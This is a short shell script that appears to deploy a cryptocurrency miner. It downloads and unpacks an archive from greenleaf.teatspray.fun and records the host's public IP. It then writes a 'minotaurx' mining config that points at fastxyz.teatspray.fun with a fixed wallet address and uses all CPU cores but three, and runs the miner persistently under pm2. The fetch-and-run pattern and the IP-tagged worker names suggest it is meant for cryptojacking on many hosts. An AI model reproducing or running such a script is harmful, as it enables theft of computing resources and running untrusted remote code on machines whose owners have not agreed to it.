#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
whoami
ls -la
cd chrome-mint

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo $used_num_of_cores
provider="Shiny_"
provider+=$underscored_ip
echo ""

sleep 2

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "fastxyz.teatspray.fun",
  "port": 6000,
  "worker": "solo:MBqp1j1SARjzcy5ukYdAuriCaFX2hDpNgK@$provider",
  "password": "x",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 2

pm2 delete index.js

sleep 2

pm2 start index.js

sleep 2

pm2 monit
